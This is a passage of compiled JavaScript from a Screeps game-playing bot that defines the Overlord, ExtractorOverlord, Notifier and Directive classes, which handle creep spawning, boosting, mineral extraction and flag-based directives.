 * construction sites. Overlords handle spawning or obtaining suitable creeps to do these things and contain the actual
 * implementation of doing them.
 */
let Overlord = class Overlord {
    constructor(initializer, name, priority) {
        this.initializer = initializer;
        // this.memory = Mem.wrap(initializer.memory, name, OverlordMemoryDefaults);
        this.room = initializer.room;
        this.priority = priority;
        this.name = name;
        this.ref = initializer.ref + '>' + name;
        this.pos = initializer.pos;
        this.colony = hasColony(initializer) ? initializer.colony : initializer;
        this.spawnGroup = undefined;
        this._zerg = {};
        this._combatZerg = {};
        this.recalculateCreeps();
        this.creepUsageReport = _.mapValues(this._creeps, creep => undefined);
        this.boosts = _.mapValues(this._creeps, creep => undefined);
        // Register the overlord on the colony overseer and on the overmind
        Overmind.overlords[this.ref] = this;
        Overmind.overseer.registerOverlord(this);
    }
    get isSuspended() {
        return Overmind.overseer.isOverlordSuspended(this);
    }
    suspendFor(ticks) {
        return Overmind.overseer.suspendOverlordFor(this, ticks);
    }
    suspendUntil(untilTick) {
        return Overmind.overseer.suspendOverlordUntil(this, untilTick);
    }
    /**
     * Refreshes overlord, recalculating creeps and refreshing existing Zerg. New creeps are automatically added,
     * and the corresponding role groups (e.g. 'queens') are automatically updated. Child methods do not need to
     * refresh their zerg properties, only other room objects stored on the Overlord.
     */
    refresh() {
        // // Handle suspension // TODO: finish this
        // if (this.memory.suspendUntil) {
        //  if (Game.time < this.memory.suspendUntil) {
        //      return;
        //  } else {
        //      delete this.memory.suspendUntil;
        //  }
        // }
        // Refresh room
        this.room = Game.rooms[this.pos.roomName];
        // Refresh zerg
        this.recalculateCreeps();
        for (const role in this._creeps) {
            for (const creep of this._creeps[role]) {
                if (Overmind.zerg[creep.name]) {
                    // log.debug(`Refreshing creep ${creep.name}`)
                    Overmind.zerg[creep.name].refresh();
                }
                else {
                    log.warning(`${this.print}: could not find and refresh zerg with name ${creep.name}!`);
                }
            }
        }
    }
    get print() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.pos.roomName + '">[' + this.ref + ']</a>';
    }
    recalculateCreeps() {
        // Recalculate the sets of creeps for each role in this overlord
        this._creeps = _.mapValues(Overmind.cache.overlords[this.ref], creepsOfRole => _.map(creepsOfRole, creepName => Game.creeps[creepName]));
        // Update zerg and combatZerg records
        for (const role in this._zerg) {
            this.synchronizeZerg(role);
        }
        for (const role in this._combatZerg) {
            this.synchronizeCombatZerg(role);
        }
    }
    /**
     * Wraps all creeps of a given role to Zerg objects and updates the contents in future ticks to avoid having to
     * explicitly refresh groups of Zerg
     */
    zerg(role, opts = {}) {
        if (!this._zerg[role]) {
            this._zerg[role] = [];
            this.synchronizeZerg(role, opts.notifyWhenAttacked);
        }
        if (opts.boostWishlist) {
            this.boosts[role] = opts.boostWishlist;
        }
        return this._zerg[role];
    }
    synchronizeZerg(role, notifyWhenAttacked) {
        // Synchronize the corresponding sets of Zerg
        const zergNames = _.zipObject(_.map(this._zerg[role] || [], zerg => [zerg.name, true]));
        const creepNames = _.zipObject(_.map(this._creeps[role] || [], creep => [creep.name, true]));
        // Add new creeps which aren't in the _zerg record
        for (const creep of this._creeps[role] || []) {
            if (!zergNames[creep.name]) {
                this._zerg[role].push(Overmind.zerg[creep.name] || new Zerg(creep, notifyWhenAttacked));
            }
        }
        // Remove dead/reassigned creeps from the _zerg record
        for (const zerg of this._zerg[role]) {
            if (!creepNames[zerg.name]) {
                _.remove(this._zerg[role], z => z.name == zerg.name);
            }
        }
    }
    /**
     * Wraps all creeps of a given role to CombatZerg objects and updates the contents in future ticks
     */
    combatZerg(role, opts = {}) {
        if (!this._combatZerg[role]) {
            this._combatZerg[role] = [];
            this.synchronizeCombatZerg(role, opts.notifyWhenAttacked);
        }
        if (opts.boostWishlist) {
            this.boosts[role] = opts.boostWishlist;
        }
        return this._combatZerg[role];
    }
    synchronizeCombatZerg(role, notifyWhenAttacked) {
        // Synchronize the corresponding sets of CombatZerg
        const zergNames = _.zipObject(_.map(this._combatZerg[role] || [], zerg => [zerg.name, true]));
        const creepNames = _.zipObject(_.map(this._creeps[role] || [], creep => [creep.name, true]));
        // Add new creeps which aren't in the _combatZerg record
        for (const creep of this._creeps[role] || []) {
            if (!zergNames[creep.name]) {
                if (Overmind.zerg[creep.name] && Overmind.zerg[creep.name].isCombatZerg) {
                    this._combatZerg[role].push(Overmind.zerg[creep.name]);
                }
                else {
                    this._combatZerg[role].push(new CombatZerg(creep, notifyWhenAttacked));
                }
            }
        }
        // Remove dead/reassigned creeps from the _combatZerg record
        for (const zerg of this._combatZerg[role]) {
            if (!creepNames[zerg.name]) {
                _.remove(this._combatZerg[role], z => z.name == zerg.name);
            }
        }
    }
    /* Gets the "ID" of the outpost this overlord is operating in. 0 for owned rooms, >= 1 for outposts, -1 for other */
    get outpostIndex() {
        return _.findIndex(this.colony.roomNames, roomName => roomName == this.pos.roomName);
    }
    reassignIdleCreeps(role) {
        // Find all creeps without an overlord
        const idleCreeps = _.filter(this.colony.getCreepsByRole(role), creep => !getOverlord(creep));
        // Reassign them all to this flag
        for (const creep of idleCreeps) {
            setOverlord(creep, this);
        }
    }
    // /* Returns all creeps of a specified role */
    // protected creeps(role: string): Creep[] {
    //  if (this._creeps[role]) {
    //      return this._creeps[role];
    //  } else {
    //      return [];
    //  }
    // }
    creepReport(role, currentAmt, neededAmt) {
        this.creepUsageReport[role] = [currentAmt, neededAmt];
    }
    // TODO: include creep move speed
    lifetimeFilter(creeps, prespawn = DEFAULT_PRESPAWN, spawnDistance) {
        if (!spawnDistance) {
            spawnDistance = 0;
            if (this.spawnGroup) {
                const distances = _.take(_.sortBy(this.spawnGroup.memory.distances), 2);
                spawnDistance = (_.sum(distances) / distances.length) || 0;
            }
            else if (this.colony.hatchery) {
                // Use distance or 0 (in case distance returns something undefined due to incomplete pathfinding)
                spawnDistance = Pathing.distance(this.pos, this.colony.hatchery.pos) || 0;
            }
            if (this.colony.isIncubating && this.colony.spawnGroup) {
                spawnDistance += this.colony.spawnGroup.stats.avgDistance;
            }
        }
        /* The last condition fixes a bug only present on private servers that took me a fucking week to isolate.
         * At the tick of birth, creep.spawning = false and creep.ticksTolive = undefined
         * See: https://screeps.com/forum/topic/443/creep-spawning-is-not-updated-correctly-after-spawn-process */
        return _.filter(creeps, creep => creep.ticksToLive > CREEP_SPAWN_TIME * creep.body.length + spawnDistance + prespawn ||
            creep.spawning || (!creep.spawning && !creep.ticksToLive));
    }
    parkCreepsIfIdle(creeps, outsideHatchery = true) {
        for (const creep of creeps) {
            if (!creep) {
                console.log(`creeps: ${_.map(creeps, creep => creep.name)}`);
                continue;
            }
            if (creep.isIdle && creep.canExecute('move')) {
                if (this.colony.hatchery) {
                    const hatcheryRestrictedRange = 6;
                    if (creep.pos.getRangeTo(this.colony.hatchery.pos) < hatcheryRestrictedRange) {
                        const hatcheryBorder = this.colony.hatchery.pos.getPositionsAtRange(hatcheryRestrictedRange);
                        const moveToPos = creep.pos.findClosestByRange(hatcheryBorder);
                        if (moveToPos)
                            creep.goTo(moveToPos);
                    }
                    else {
                        creep.park();
                    }
                }
                else {
                    creep.park();
                }
            }
        }
    }
    /**
     * Requests a group of (2-3) creeps from a hatchery to be spawned at the same time. Using this with low-priority
     * operations can result in a long time
     */
    requestSquad(setups, opts = {}) {
        log.warning(`Overlord.requestSquad() is not finished yet!`); // TODO: finish
        _.defaults(opts, { priority: this.priority, prespawn: DEFAULT_PRESPAWN });
        const spawner = this.spawnGroup || this.colony.spawnGroup || this.colony.hatchery;
        if (spawner) {
            if (setups.length > 3) {
                log.warning(`Requesting squads of >3 is not advisable`);
            }
            const request = {
                setup: _.head(setups),
                overlord: this,
                priority: opts.priority,
                partners: _.tail(setups),
            };
            if (opts.options) {
                request.options = opts.options;
            }
            spawner.enqueue(request);
        }
        else {
            if (Game.time % 100 == 0) {
                log.warning(`Overlord ${this.ref} @ ${this.pos.print}: no spawner object!`);
            }
        }
    }
    /**
     * Create a creep setup and enqueue it to the Hatchery; does not include automatic reporting
     */
    requestCreep(setup, opts = {}) {
        _.defaults(opts, { priority: this.priority, prespawn: DEFAULT_PRESPAWN });
        const spawner = this.spawnGroup || this.colony.spawnGroup || this.colony.hatchery;
        if (spawner) {
            const request = {
                setup: setup,
                overlord: this,
                priority: opts.priority,
            };
            if (opts.partners) {
                request.partners = opts.partners;
            }
            if (opts.options) {
                request.options = opts.options;
            }
            spawner.enqueue(request);
        }
        else {
            if (Game.time % 100 == 0) {
                log.warning(`Overlord ${this.ref} @ ${this.pos.print}: no spawner object!`);
            }
        }
    }
    /**
     * Wishlist of creeps to simplify spawning logic; includes automatic reporting
     */
    wishlist(quantity, setup, opts = {}) {
        _.defaults(opts, { priority: this.priority, prespawn: DEFAULT_PRESPAWN, reassignIdle: false });
        let creepQuantity;
        if (opts.noLifetimeFilter) {
            creepQuantity = (this._creeps[setup.role] || []).length;
        }
        else if (_.has(this.initializer, 'waypoints')) {
            // TODO: replace hardcoded distance with distance computed through portals
            creepQuantity = this.lifetimeFilter(this._creeps[setup.role] || [], opts.prespawn, 500).length;
        }
        else {
            creepQuantity = this.lifetimeFilter(this._creeps[setup.role] || [], opts.prespawn).length;
        }
        let spawnQuantity = quantity - creepQuantity;
        if (opts.reassignIdle && spawnQuantity > 0) {
            const idleCreeps = _.filter(this.colony.getCreepsByRole(setup.role), creep => !getOverlord(creep));
            for (let i = 0; i < Math.min(idleCreeps.length, spawnQuantity); i++) {
                setOverlord(idleCreeps[i], this);
                spawnQuantity--;
            }
        }
        // A bug in outpostDefenseOverlord caused infinite requests and cost me two botarena rounds before I found it...
        if (spawnQuantity > MAX_SPAWN_REQUESTS) {
            log.warning(`Too many requests for ${setup.role}s submitted by ${this.print}! (Check for errors.)`);
        }
        else {
            for (let i = 0; i < spawnQuantity; i++) {
                this.requestCreep(setup, opts);
            }
        }
        this.creepReport(setup.role, creepQuantity, quantity);
    }
    // TODO: finish this; currently requires host colony to have evolution chamber
    canBoostSetup(setup) {
        if (this.colony.evolutionChamber && this.boosts[setup.role] && this.boosts[setup.role].length > 0) {
            let energyCapacityAvailable;
            if (this.spawnGroup) {
                energyCapacityAvailable = this.spawnGroup.energyCapacityAvailable;
            }
            else if (this.colony.spawnGroup) {
                energyCapacityAvailable = this.colony.spawnGroup.energyCapacityAvailable;
            }
            else if (this.colony.hatchery) {
                energyCapacityAvailable = this.colony.hatchery.room.energyCapacityAvailable;
            }
            else {
                return false;
            }
            const body = _.map(setup.generateBody(energyCapacityAvailable), part => ({ type: part, hits: 100 }));
            if (body.length == 0)
                return false;
            return _.all(this.boosts[setup.role], boost => this.colony.evolutionChamber.canBoost(body, boost));
        }
        return false;
    }
    /**
     * Return whether you are capable of boosting a creep to the desired specifications
     */
    shouldBoost(creep, onlyBoostInSpawn = false) {
        // Can't boost if there's no evolution chamber or TTL is less than threshold
        const colony = Overmind.colonies[creep.room.name];
        const evolutionChamber = colony ? colony.evolutionChamber : undefined;
        if (!evolutionChamber ||
            (creep.ticksToLive && creep.ticksToLive < MIN_LIFETIME_FOR_BOOST * creep.lifetime)) {
            return false;
        }
        // EDIT: they removed in-spawn boosting... RIP :(
        // // If you're in a bunker layout at level 8 with max labs, only boost while spawning
        // if (onlyBoostInSpawn && this.colony.bunker && this.colony.level == 8 && this.colony.labs.length == 10) {
        //  if (!creep.spawning) {
        //      return false;
        //  }
        // }
        // Otherwise just boost if you need it and can get the resources
        if (this.boosts[creep.roleName]) {
            const boosts = _.filter(this.boosts[creep.roleName], boost => (creep.boostCounts[boost] || 0) < creep.getActiveBodyparts(boostParts[boost]));
            if (boosts.length > 0) {
                return _.all(boosts, boost => evolutionChamber.canBoost(creep.body, boost));
            }
        }
        return false;
    }
    /**
     * Request a boost from the evolution chamber; should be called during init()
     */
    requestBoostsForCreep(creep) {
        const colony = Overmind.colonies[creep.room.name];
        const evolutionChamber = colony ? colony.evolutionChamber : undefined;
        if (evolutionChamber && this.boosts[creep.roleName]) {
            const boosts = _.filter(this.boosts[creep.roleName], boost => (creep.boostCounts[boost] || 0) < creep.getActiveBodyparts(boostParts[boost]));
            for (const boost of boosts) {
                evolutionChamber.requestBoost(creep, boost);
            }
        }
    }
    /**
     * Handle boosting of a creep; should be called during run()
     */
    handleBoosting(creep) {
        const colony = Overmind.colonies[creep.room.name];
        const evolutionChamber = colony ? colony.evolutionChamber : undefined;
        if (this.boosts[creep.roleName] && evolutionChamber) {
            const boosts = _.filter(this.boosts[creep.roleName], boost => (creep.boostCounts[boost] || 0) < creep.getActiveBodyparts(boostParts[boost]));
            for (const boost of boosts) {
                const boostLab = _.find(evolutionChamber.boostingLabs, lab => lab.mineralType == boost);
                if (boostLab) {
                    creep.task = Tasks.getBoosted(boostLab, boost);
                }
            }
        }
    }
    /**
     * Request any needed boosting resources from terminal network
     */
    requestBoosts(creeps) {
        for (const creep of creeps) {
            if (this.shouldBoost(creep)) {
                this.requestBoostsForCreep(creep);
            }
        }
    }
    /**
     * Requests that should be handled for all overlords prior to the init() phase
     */
    preInit() {
        // Handle resource requests for boosts
        for (const role in this.boosts) {
            if (this.boosts[role] && this._creeps[role]) {
                this.requestBoosts(_.compact(_.map(this._creeps[role], creep => Overmind.zerg[creep.name])));
            }
        }
    }
    /**
     * Standard sequence of actions for running task-based creeps
     */
    autoRun(roleCreeps, taskHandler, fleeCallback) {
        for (const creep of roleCreeps) {
            if (!!fleeCallback) {
                if (fleeCallback(creep))
                    continue;
            }
            if (creep.isIdle) {
                if (this.shouldBoost(creep)) {
                    this.handleBoosting(creep);
                }
                else {
                    taskHandler(creep);
                }
            }
            creep.run();
        }
    }
    visuals() {
    }
};
Overlord = __decorate([
    profile
], Overlord);
function getOverlord(creep) {
    if (creep.memory["O" /* OVERLORD */]) {
        return Overmind.overlords[creep.memory["O" /* OVERLORD */]] || null;
    }
    else {
        return null;
    }
}
function setOverlord(creep, newOverlord) {
    // Remove cache references to old assignments
    const roleName = creep.memory.role;
    const ref = creep.memory["O" /* OVERLORD */];
    const oldOverlord = ref ? Overmind.overlords[ref] : null;
    if (ref && Overmind.cache.overlords[ref] && Overmind.cache.overlords[ref][roleName]) {
        _.remove(Overmind.cache.overlords[ref][roleName], name => name == creep.name);
    }
    if (newOverlord) {
        // Change to the new overlord's colony
        creep.memory["C" /* COLONY */] = newOverlord.colony.name;
        // Change assignments in memory
        creep.memory["O" /* OVERLORD */] = newOverlord.ref;
        // Update the cache references
        if (!Overmind.cache.overlords[newOverlord.ref]) {
            Overmind.cache.overlords[newOverlord.ref] = {};
        }
        if (!Overmind.cache.overlords[newOverlord.ref][roleName]) {
            Overmind.cache.overlords[newOverlord.ref][roleName] = [];
        }
        Overmind.cache.overlords[newOverlord.ref][roleName].push(creep.name);
    }
    else {
        creep.memory["O" /* OVERLORD */] = null;
    }
    if (oldOverlord)
        oldOverlord.recalculateCreeps();
    if (newOverlord)
        newOverlord.recalculateCreeps();
    log.info(`${creep.name} has been reassigned from ${oldOverlord ? oldOverlord.print : 'IDLE'} ` +
        `to ${newOverlord ? newOverlord.print : 'IDLE'}`);
}

var ExtractorOverlord_1;
const BUILD_OUTPUT_FREQUENCY = 15;
/**
 * Spawns extractors to harvest minerals in an owned or sourcekeeper room
 */
let ExtractorOverlord = ExtractorOverlord_1 = class ExtractorOverlord extends Overlord {
    constructor(directive, priority) {
        super(directive, 'mineral', priority);
        this.directive = directive;
        this.priority += this.outpostIndex * OverlordPriority.remoteSKRoom.roomIncrement;
        this.drones = this.zerg(Roles.drone);
        // Populate structures
        this.populateStructures();
    }
    populateStructures() {
        if (Game.rooms[this.pos.roomName]) {
            this.extractor = this.pos.lookForStructure(STRUCTURE_EXTRACTOR);
            this.mineral = this.pos.lookFor(LOOK_MINERALS)[0];
            this.container = this.pos.findClosestByLimitedRange(Game.rooms[this.pos.roomName].containers, 1);
        }
    }
    refresh() {
        if (!this.room && Game.rooms[this.pos.roomName]) { // if you just gained vision of this room
            this.populateStructures();
        }
        super.refresh();
        $.refresh(this, 'extractor', 'mineral', 'container');
    }
    registerOutputRequests() {
        if (this.container) {
            if (_.sum(this.container.store) > 0.5 * this.container.storeCapacity ||
                (_.sum(this.container.store) > 0 && this.drones.length == 0)) {
                this.colony.logisticsNetwork.requestOutput(this.container, { resourceType: 'all' });
            }
        }
    }
    /* Calculate where the container output will be built for this site */
    calculateContainerPos() {
        // log.debug(`Computing container position for mining overlord at ${this.pos.print}...`);
        let originPos;
        if (this.colony.storage) {
            originPos = this.colony.storage.pos;
        }
        else if (this.colony.roomPlanner.storagePos) {
            originPos = this.colony.roomPlanner.storagePos;
        }
        if (originPos) {
            const path = Pathing.findShortestPath(this.pos, originPos).path;
            const pos = _.find(path, pos => pos.getRangeTo(this) == 1);
            if (pos)
                return pos;
        }
        // Shouldn't ever get here
        log.warning(`Last resort container position calculation for ${this.print}!`);
        return _.first(this.pos.availableNeighbors(true));
    }
    buildOutputIfNeeded() {
        // Create container if there is not already one being built and no link
        if (!this.container) {
            const containerSite = _.first(_.filter(this.pos.findInRange(FIND_MY_CONSTRUCTION_SITES, 2), site => site.structureType == STRUCTURE_CONTAINER));
            if (!containerSite) {
                const containerPos = this.calculateContainerPos();
                log.info(`${this.print}: building container at ${containerPos.print}`);
                const result = containerPos.createConstructionSite(STRUCTURE_CONTAINER);
                if (result != OK) {
                    log.error(`${this.print}: cannot build container at ${containerPos.print}! Result: ${result}`);
                }
                return;
            }
        }
    }
    init() {
        const amount = this.mineral && this.mineral.mineralAmount > 0 ? this.mineral.pos.availableNeighbors().length : 0;
        this.wishlist(Math.min(amount, ExtractorOverlord_1.settings.maxDrones), Setups.drones.extractor);
        this.registerOutputRequests();
    }
    handleDrone(drone) {
        // Ensure you are in the assigned room
        if (drone.room == this.room && !drone.pos.isEdge) {
            if (_.sum(drone.carry) == 0) {
                drone.task = Tasks.harvest(this.mineral);
            }
            // Else see if there is an output to depsit to or to maintain
            else if (this.container) {
                drone.task = Tasks.transferAll(this.container);
                // Move onto the output container if you're the only drone
                if (!drone.pos.isEqualTo(this.container.pos) && this.drones.length == 1) {
                    drone.goTo(this.container, { range: 0 });
                }
            }
        }
        else {
            drone.goTo(this);
        }
    }
    run() {
        this.autoRun(this.drones, drone => this.handleDrone(drone), drone => drone.flee());
        if (this.room && Game.time % BUILD_OUTPUT_FREQUENCY == 2) {
            this.buildOutputIfNeeded();
        }
    }
};
ExtractorOverlord.settings = {
    maxDrones: 2,
};
ExtractorOverlord = ExtractorOverlord_1 = __decorate([
    profile
], ExtractorOverlord);

var NotifierPriority;
(function (NotifierPriority) {
    NotifierPriority[NotifierPriority["Critical"] = 0] = "Critical";
    NotifierPriority[NotifierPriority["High"] = 1] = "High";
    NotifierPriority[NotifierPriority["Normal"] = 2] = "Normal";
    NotifierPriority[NotifierPriority["Low"] = 3] = "Low";
})(NotifierPriority || (NotifierPriority = {}));
/**
 * Records one-time and persistent notifications from various in-game events
 */
class Notifier {
    constructor() {
        this.alerts = [];
        this.notifications = [];
    }
    clear() {
        this.alerts = [];
    }
    alert(message, roomName, priority = NotifierPriority.Normal) {
        // Register an alert to be displayed this in the notifications visual box
        const alert = { message, roomName, priority };
        this.alerts.push(alert);
    }
    // TODO: finish
    notify(message, roomName, duration = 100, email = false) {
        log.alert(printRoomName(roomName) + ': ' + message);
    }
    // init() {
    //
    // }
    //
    // run() {
    //
    // }
    generateNotificationsList(links = false) {
        const sortedAlerts = _.sortBy(this.alerts, alert => alert.priority);
        return _.map(sortedAlerts, alert => {
            if (alert.roomName) {
                return (links ? printRoomName(alert.roomName) : alert.roomName) + ': ' + alert.message;
            }
            else {
                return alert.message;
            }
        });
    }
    visuals() {
        const notificationMessages = this.generateNotificationsList();
        Visualizer.drawNotifications(notificationMessages);
    }
}

const DEFAULT_MAX_PATH_LENGTH = 600;
const DEFAULT_MAX_LINEAR_RANGE = 10;
/**
 * Directives are contextual wrappers for flags and serve as attachment points for Overlords, acting as a sort of
 * "process table" for the bot, with individual processes (Overlords) run by the scheulder (Overseer)
 */
let Directive = class Directive {
    constructor(flag, colonyFilter) {
        this.memory = flag.memory;
        if (this.memory.suspendUntil) {
            if (Game.time < this.memory.suspendUntil) {
                return;
            }
            else {
                delete this.memory.suspendUntil;
            }
        }
        this.name = flag.name;
        this.ref = flag.ref;
        if (!this.memory["T" /* TICK */]) {
            this.memory["T" /* TICK */] = Game.time;
        }
        if (this.memory.waypoints) {
            this.waypoints = _.map(this.memory.waypoints, posName => getPosFromString(posName));
        }
        // Relocate flag if needed; this must be called before the colony calculations
        const needsRelocating = this.handleRelocation();
        if (!needsRelocating) {
            this.pos = flag.pos;
            this.room = flag.room;
        }
        const colony = this.getColony(colonyFilter);
        // Delete the directive if the colony is dead
        if (!colony) {
            if (Overmind.exceptions.length == 0) {
                log.alert(`Could not get colony for directive ${this.print}; removing flag!`);
                flag.remove();
            }
            else {
                log.alert(`Could not get colony for directive ${this.print}; ` +
                    `exceptions present this tick, so won't remove`);
            }
            return;
        }
        // Delete the directive if expired
        if (this.memory["X" /* EXPIRATION */] && Game.time > this.memory["X" /* EXPIRATION */]) {
            log.alert(`Removing expired directive ${this.print}!`);
            flag.remove();
            return;
        }
        // Register colony and add flags to colony.flags
        this.colony = colony;
        this.colony.flags.push(flag);
        this.overlords = {};
        // Register directive on Overmind
        global[this.name] = this;
        Overmind.overseer.registerDirective(this);
        Overmind.directives[this.name] = this;
    }
    /**
     * Gets an effective room position for a directive; allows you to reference this.pos in constructor super() without
     * throwing an error
     */
    static getPos(flag) {
        if (flag.memory && flag.memory.setPosition) {
            const pos = derefRoomPosition(flag.memory.setPosition);
            return pos;
        }
        return flag.pos;
    }
    // Flag must be a getter to avoid caching issues
    get flag() {
        return Game.flags[this.name];
    }
    // get isSuspended(): boolean {
    //  return !!this.memory.suspendUntil && Game.time < this.memory.suspendUntil;
    // }
    //
    // suspend(ticks: number) {
    //  this.memory.suspendUntil = Game.time + ticks;
    // }
    //
    // suspendUntil(tick: number) {
    //  this.memory.suspendUntil = tick;
    // }
    refresh() {
        const flag = this.flag;
        if (!flag) {
            log.warning(`Missing flag for directive ${this.print}! Removing directive.`);
            this.remove();
            return;
        }
        this.memory = flag.memory;
        this.pos = flag.pos;
        this.room = flag.room;
    }
    alert(message, priority = NotifierPriority.Normal) {
        Overmind.overseer.notifier.alert(message, this.pos.roomName, priority);
    }
    get print() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.pos.roomName + '">[' + this.name + ']</a>';
    }
    handleRelocation() {
        if (this.memory.setPosition) {
            const pos = derefRoomPosition(this.memory.setPosition);
            if (!this.flag.pos.isEqualTo(pos)) {
                const result = this.flag.setPosition(pos);
                if (result == OK) {
                    log.debug(`Moving ${this.name} from ${this.flag.pos.print} to ${pos.print}.`);
                }
                else {
                    log.warning(`Could not set room position to ${JSON.stringify(this.memory.setPosition)}!`);
                }
            }
            else {
                delete this.memory.setPosition;
            }
            this.pos = pos;
            this.room = Game.rooms[pos.roomName];
            return true;
        }
        return false;
    }
    getColony(colonyFilter, verbose = false) {
        // If something is written to flag.colony, use that as the colony
        if (this.memory["C" /* COLONY */]) {
            return Overmind.colonies[this.memory["C" /* COLONY */]];
        }
        else {
            // If flag contains a colony name as a substring, assign to that colony, regardless of RCL
            const colonyNames = _.keys(Overmind.colonies);
            for (const name of colonyNames) {
                if (this.name.includes(name)) {
                    if (this.name.split(name)[1] != '')
                        continue; // in case of other substring, e.g. E11S12 and E11S1
                    this.memory["C" /* COLONY */] = name;
                    return Overmind.colonies[name];
                }
            }
            // If flag is in a room belonging to a colony and the colony has sufficient RCL, assign to there
            const colony = Overmind.colonies[Overmind.colonyMap[this.pos.roomName]];
            if (colony) {
                if (!colonyFilter || colonyFilter(colony)) {
                    this.memory["C" /* COLONY */] = colony.name;
                    return colony;
                }
            }
            // Otherwise assign to closest colony
            const nearestColony = this.findNearestColony(colonyFilter, verbose);
            if (nearestColony) {
                log.info(`Colony ${nearestColony.room.print} assigned to ${this.name}.`);
                this.memory["C" /* COLONY */] = nearestColony.room.name;
                return nearestColony;
            }
            else {
                log.error(`Could not find colony match for ${this.name} in ${this.pos.roomName}! ` +
                    `Try setting memory.maxPathLength and memory.maxLinearRange.`);
            }
        }
    }
    findNearestColony(colonyFilter, verbose = false) {
        const maxPathLength = this.memory.maxPathLength || DEFAULT_MAX_PATH_LENGTH;
        const maxLinearRange = this.memory.maxLinearRange || DEFAULT_MAX_LINEAR_RANGE;
        if (verbose)
            log.info(`Recalculating colony association for ${this.name} in ${this.pos.roomName}`);
        let nearestColony;
        let minDistance = Infinity;
        const colonyRooms = _.filter(Game.rooms, room => room.my);
        for (const colony of getAllColonies()) {
            if (Game.map.getRoomLinearDistance(this.pos.roomName, colony.name) > maxLinearRange) {
                continue;
            }
            if (!colonyFilter || colonyFilter(colony)) {
                const ret = Pathing.findPath((colony.hatchery || colony).pos, this.pos);
                if (!ret.incomplete) {
                    if (ret.path.length < maxPathLength && ret.path.length < minDistance) {
                        nearestColony = colony;
                        minDistance = ret.path.length;
                    }
                    if (verbose)
                        log.info(`Path length to ${colony.room.print}: ${ret.path.length}`);
                }
                else {
                    if (verbose)
                        log.info(`Incomplete path from ${colony.room.print}`);
                }
            }
        }
        if (nearestColony) {
            return nearestColony;
        }
    }
    // Wrapped flag methods ============================================================================================
    remove(force = false) {
        if (!this.memory.persistent || force) {
            delete Overmind.directives[this.name];
            delete global[this];
            Overmind.overseer.removeDirective(this);
            if (this.colony) {
                _.remove(this.colony.flags, flag => flag.name == this.name);
            }
            if (this.flag) { // check in case flag was removed manually in last build cycle
                return this.flag.remove();
            }
        }
    }
    setColor(color$$1, secondaryColor) {
        if (secondaryColor) {
            return this.flag.setColor(color$$1, secondaryColor);
        }
        else {
            return this.flag.setColor(color$$1);
        }
    }
    setPosition(pos) {
        // Ignore the (x,y) setPosition option since I never use it
        return this.flag.setPosition(pos);
    }
    // Custom directive methods ========================================================================================
    /* Create an appropriate flag to instantiate this directive in the next tick */
    static create(pos, opts = {}) {
        let flagName = opts.name || undefined;
        if (!flagName) {
            flagName = this.directiveName + ':' + randomHex(6);
            if (Game.flags[flagName]) {
                return ERR_NAME_EXISTS;
            }
        }
        if (!opts.quiet) {
            log.alert(`Creating ${this.directiveName} directive at ${pos.print}!`);
        }
        const result = pos.createFlag(flagName, this.color, this.secondaryColor);
        if (result == flagName && opts.memory) {
            Memory.flags[flagName] = opts.memory;
        }
        log.debug(`Result: ${result}, memory: ${JSON.stringify(Memory.flags[result])}`);
        return result;
    }
    /* Whether a directive of the same type is already present (in room | at position) */
    static isPresent(pos, scope) {
        const room = Game.rooms[pos.roomName];
        switch (scope) {
            case 'room':
                if (room) {
                    return _.filter(room.flags, flag => this.filter(flag) &&
                        !(flag.memory.setPosition
                            && flag.memory.setPosition.roomName != pos.roomName)).length > 0;
                }
                else {
                    const flagsInRoom = _.filter(Game.flags, function (flag) {
                        if (flag.memory.setPosition) { // does it need to be relocated?
                            return flag.memory.setPosition.roomName == pos.roomName;
                        }
                        else { // properly located
                            return flag.pos.roomName == pos.roomName;
                        }
                    });
                    return _.filter(flagsInRoom, flag => this.filter(flag)).length > 0;
                }
            case 'pos':
                if (room) {
                    return _.filter(pos.lookFor(LOOK_FLAGS), flag => this.filter(flag) &&
                        !(flag.memory.setPosition
                            && !equalXYR(pos, flag.memory.setPosition))).length > 0;
                }
                else {
                    const flagsAtPos = _.filter(Game.flags, function (flag) {
                        if (flag.memory.setPosition) { // does it need to be relocated?
                            return equalXYR(flag.memory.setPosition, pos);
                        }
                        else { // properly located
                            return equalXYR(flag.pos, pos);
                        }
                    });
                    return _.filter(flagsAtPos, flag => this.filter(flag)).length > 0;
                }
        }
    }
    /* Create a directive if one of the same type is not already present (in room | at position).
     * Calling this method on positions in invisible rooms can be expensive and should be used sparingly. */
    static createIfNotPresent(pos, scope, opts = {}) {
        if (this.isPresent(pos, scope)) {
            return; // do nothing if flag is already here
        }
        const room = Game.rooms[pos.roomName];
        if (!room) {
            if (!opts.memory) {
                opts.memory = {};
            }
            opts.memory.setPosition = pos;
        }
        switch (scope) {
            case 'room':
                if (room) {
                    return this.create(pos, opts);
                }
                else {
                    log.info(`Creating directive at ${pos.print}... ` +
                        `No visibility in room; directive will be relocated on next tick.`);
                    let createAtPos;
                    if (opts.memory && opts.memory["C" /* COLONY */]) {
                        createAtPos = Pathing.findPathablePosition(opts.memory["C" /* COLONY */]);
                    }
                    else {
                        createAtPos = Pathing.findPathablePosition(_.first(getAllColonies()).room.name);
                    }
                    return this.create(createAtPos, opts);
                }
            case 'pos':
                if (room) {
                    return this.create(pos, opts);
                }
                else {
                    log.info(`Creating directive at ${pos.print}... ` +
                        `No visibility in room; directive will be relocated on next tick.`);
                    let createAtPos;
                    if (opts.memory && opts.memory["C" /* COLONY */]) {
                        createAtPos = Pathing.findPathablePosition(opts.memory["C" /* COLONY */]);
                    }
                    else {
                        createAtPos = Pathing.findPathablePosition(_.first(getAllColonies()).room.name);
                    }
                    return this.create(createAtPos, opts);
                }
        }
    }
    /* Filter for _.filter() that checks if a flag is of the matching type */
    static filter(flag) {
        return flag.color == this.color && flag.secondaryColor == this.secondaryColor;
    }
    /* Map a list of flags to directives, accepting a filter */
    static find(flags) {
        flags = _.filter(flags, flag => this.filter(flag));
        return _.compact(_.map(flags, flag => Overmind.directives[flag.name]));
    }
    // Overwrite this in child classes to display relevant information
    visuals() {
    }
};
Directive = __decorate([
    profile
], Directive);

/**
 * Mineral extraction directive. Spawns extraction creeps to operate extractors in owned or source keeper rooms
 */
let DirectiveExtract = class DirectiveExtract extends Directive {
    constructor(flag) {
        super(flag);
        if (this.colony) {
            this.colony.destinations.push({ pos: this.pos, order: this.memory["T" /* TICK */] || Game.time });
        }
    }
